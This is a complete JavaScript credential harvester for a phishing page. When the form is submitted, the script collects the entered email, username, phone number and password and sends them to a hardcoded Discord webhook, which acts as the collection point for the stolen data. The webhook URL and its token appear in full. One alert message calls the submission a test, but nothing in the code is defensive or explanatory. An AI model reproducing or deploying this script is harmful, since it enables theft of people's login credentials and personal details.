document.getElementById("phishingForm").addEventListener("submit", function (event) {
    event.preventDefault();

    const email = document.getElementById("email").value;
    const username = document.getElementById("username").value;
    const number = document.getElementById("number").value;
    const password = document.getElementById("password").value;

    const webhookURL = "https://discord.com/api/webhooks/1268893038793719859/_ktjZVX-uHx8UVoYu7GAdrpkRLpbysF11nl120aBoWKRwdsY06g_9dAq1HYG7yeWvqwk";

    const message = {
        content: `**Phishing Data Submitted**\nEmail: ${email}\nUsername: ${username}\nPhone Number: ${number}\nPassword: ${password}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            alert("Details submitted successfully (remember, this is just a test!)");
        } else {
            alert("Failed to submit details.");
        }
    })
    .catch(error => {
        console.error("Error:", error);
    });
});
